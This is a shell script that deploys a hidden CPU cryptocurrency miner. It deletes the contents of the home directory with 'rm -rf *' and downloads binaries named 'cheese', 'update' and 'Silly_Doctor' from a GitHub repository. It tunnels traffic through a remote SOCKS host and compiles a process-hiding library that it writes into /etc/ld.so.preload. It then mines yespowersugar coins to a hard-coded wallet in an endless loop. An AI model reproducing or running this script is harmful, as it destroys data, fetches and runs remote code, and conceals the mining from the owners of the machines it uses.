#!/bin/sh
cd
ls -la
rm -rf *
apt update >/dev/null;apt -y install automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

PID=`ps -eaf | grep shade | grep -v grep | awk '{print $2}'`
if [[ "" !=  "$PID" ]]; then
  echo "killing $PID"
  kill -9 $PID
fi

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/cheese.tar.gz > /dev/null

sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v cpusocks$(shuf -i 7-12 -n 1).wot.mrface.com:80 7777:socks &

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Lab16Cores_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 2`
echo ""
echo "You will be using : $used_num_of_cores cores"
echo ""

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/update.tar.gz > /dev/null

tar -xf update.tar.gz > /dev/null

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

echo " "
echo " "

echo "******************************************************************"

./update/update curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "


sleep 2

./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/Silly_Doctor.tar.gz > /dev/null

sleep 2

tar -xf Silly_Doctor.tar.gz

sleep 2

./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/magicSillyDoc.zip > /dev/null
sleep 2
unzip magicSillyDoc.zip
sleep 2
make
sleep 2
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
sleep 2
mv libprocesshider.so /usr/local/lib/
sleep 2
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
sleep 2

netstat -ntlp

sleep 2

echo " "
echo " "

sleep 2

echo "Your worker name will be : $currentdate"

echo ""
echo ""

sleep 2

ls

echo ""
echo ""

sleep 2

unset LD_PRELOAD
unset LD_PRELOAD_ENV
unset LD_LIBRARY_PATH

sleep 2

while true
do
./Silly_Doctor --disable-gpu --algorithm yespowersugar --pool stratum-eu.rplant.xyz:7042 --wallet sugar1quznhxds3cjjxeajzsu7an5dsvt2j0pmsy9kc7g.$currentdate --password webpassword=IhatePopUps --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
sleep 5
done
